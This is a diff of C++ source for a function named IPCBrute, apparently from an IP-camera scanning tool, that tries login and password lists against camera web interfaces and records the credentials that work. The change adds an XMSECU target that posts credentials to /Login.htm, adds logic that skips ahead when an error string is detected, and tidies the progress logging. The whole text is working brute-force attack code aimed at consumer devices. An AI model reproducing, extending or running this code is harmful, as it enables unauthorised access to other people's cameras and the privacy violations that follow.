@@ -6,14 +6,15 @@
 lopaStr IPC::IPCBrute(const char *ip, int port, char *SPEC, const std::string *cookie)
 {
     lopaStr lps = {"UNKNOWN", "", ""};
-    bool result = true;
+    int result = 0;
     char login[128] = {0};
     char pass[128] = {0};
     char request[1024] = {0};
     int passCounter = 1;
 	int rowIndex = -1;
 
-    std::vector<char*> negVector;
+	std::vector<char*> negVector;
+	std::vector<char*> slideVector;
     if(strcmp(SPEC, "IPC") == 0)
     {
         negVector.push_back("<UserGroup>Invalid</UserGroup>");
@@ -91,6 +92,11 @@ lopaStr IPC::IPCBrute(const char *ip, int port, char *SPEC, const std::string *c
 	{
 		negVector.push_back("Invalid credentials");
 	}
+	else if (strcmp(SPEC, "XMSECU") == 0)
+	{
+		slideVector.push_back("errornumber=-1");
+		negVector.push_back("Log in failed");
+	}
     else
     {
         stt->doEmitionRedFoundData("[_IPCameraBrute] No \"SPEC\" specified!");
@@ -101,22 +107,20 @@ lopaStr IPC::IPCBrute(const char *ip, int port, char *SPEC, const std::string *c
     for(int i = 0; i < MaxLogin; ++i)
     {
         if(!globalScanFlag) break;
-        if(strcmp(loginLst[i], " ") == 0) continue;
-        //ZeroMemory(login, sizeof(login));
-		login[0] = 0;
-        strcpy(login, loginLst[i]);
+		FileUpdater::cv.wait(FileUpdater::lk, [] {return FileUpdater::ready; });
+		strcpy(login, loginLst[i]);
+        if(strcmp(login, " ") == 0) continue;
 
         for(int j = 0; j < MaxPass; ++j)
         {
             FileUpdater::cv.wait(FileUpdater::lk, []{return FileUpdater::ready;});
             if(!globalScanFlag) break;
             if(strcmp(passLst[j], " ") == 0) continue;
+			result = 0;
 
-            //ZeroMemory(pass, sizeof(pass));
-			pass[0] = 0;
             strcpy(pass, passLst[j]);
 
-            //ZeroMemory(request, sizeof(request));
+            ZeroMemory(request, sizeof(request));
 			request[0] = 0;
             if(strcmp(SPEC, "IPC") == 0)
             {
@@ -191,7 +195,6 @@ lopaStr IPC::IPCBrute(const char *ip, int port, char *SPEC, const std::string *c
 			}
 			else if (strcmp(SPEC, "JUAN") == 0)
 			{
-				//sprintf(request, "%s:%d/cgi-bin/gw.cgi?xml=<juan ver=\"\" squ=\"\" dir=\"\"><envload type=\"0\" usr=\"%s\" pwd=\"%s\"/></juan>&_=1450923182693",
 				sprintf(request, "%s/cgi-bin/gw.cgi?xml=%%3Cjuan%%20ver=%%22%%22%%20squ=%%22%%22%%20dir=%%22%%22%%3E%%3Cenvload%%20type=%%220%%22%%20usr=%%22%s%%22%%20pwd=%%22%s%%22/%%3E%%3C/juan%%3E&_=1450923182693",
 					ip, login, pass);
 			}
@@ -226,6 +229,12 @@ Content-Disposition: form-data; name=\"password\"\r\n\
 Content-Length: %d\r\n\r\n\
 %s", cl, tempPostData);
 			}
+			else if (strcmp(SPEC, "XMSECU") == 0)
+			{
+				doPost = true;
+				sprintf(request, "%s/Login.htm", ip);
+				sprintf(postData, "command=login&username=%s&password=%s", login, pass);
+			}
 
 			std::string buffer;
 			if (cookie->size() > 0) {
@@ -241,65 +250,53 @@ Content-Length: %d\r\n\r\n\
 			}
 
 			if (res == -2) {
-				if (rowIndex == -1) {
-					nesca_3::addBARow(QString(ip), "--", "FAIL");
-				}
-				else {
-					stt->doEmitionChangeBARow(rowIndex, "--", "FAIL");
-				}
+				rowIndex = Utils::addBARow(QString(ip), "--", "FAIL", rowIndex);
 				return lps;
 			}
 			else if (res != -1) {
+				for (int i = 0; i < slideVector.size(); ++i)
+				{
+					if (Utils::ustrstr(buffer, slideVector[i]) != -1)
+					{
+						result = -1;
+						break;
+					};
+				}
+				if (-1 == result) {
+					passCounter += MaxPass - 1;
+					break;
+				}
+
 				for (int i = 0; i < negVector.size(); ++i)
 				{
 					if (Utils::ustrstr(buffer, negVector[i]) != -1)
 					{
-						result = false;
+						result = 1;
 						break;
 					};
 				};
 
-				if (result)
+				if (0 == result)
 				{
-					strcpy(lps.login, loginLst[i]);
-					strcpy(lps.pass, passLst[j]);
+					strcpy(lps.login, login);
+					strcpy(lps.pass, pass);
 
-					if (rowIndex == -1) {
-						nesca_3::addBARow(QString(ip), QString(login) + ":" + QString(pass), "OK");
-					}
-					else {
-						stt->doEmitionChangeBARow(rowIndex, QString(login) + ":" + QString(pass), "OK");
-					}
+					rowIndex = Utils::addBARow(QString(ip), QString(login) + ":" + QString(pass), "OK", rowIndex);
 
 					return lps;
-				};
+				}
 			}
 			else {
 				return lps;
 			}
-			
-			if (BALogSwitched) {
-				if (rowIndex == -1) {
-					rowIndex = nesca_3::addBARow(QString(ip),
-						QString(login) + ":" + QString(pass),
-						QString::number((passCounter / (double)(MaxPass*MaxLogin)) * 100).mid(0, 4) + "%");
-				}
-				else {
-					stt->doEmitionChangeBARow(rowIndex, QString(login) + ":" + QString(pass),
-						QString::number((passCounter / (double)(MaxPass*MaxLogin)) * 100).mid(0, 4) + "%");
-				}
-			}
-			else { rowIndex = -1; }
+
+			rowIndex = Utils::addBARow(QString(ip), QString(login) + ":" + QString(pass), QString::number((passCounter / (double)(MaxPass*MaxLogin)) * 100).mid(0, 4) + "%", rowIndex);
 			++passCounter;
             Sleep(100);
         };
     };
-	if (rowIndex == -1) {
-		nesca_3::addBARow(QString(ip), "--", "FAIL");
-	}
-	else {
-		stt->doEmitionChangeBARow(rowIndex, "--", "FAIL");
-	}
+
+	rowIndex = Utils::addBARow(QString(ip), "--", "FAIL", rowIndex);
     return lps;
 }
 
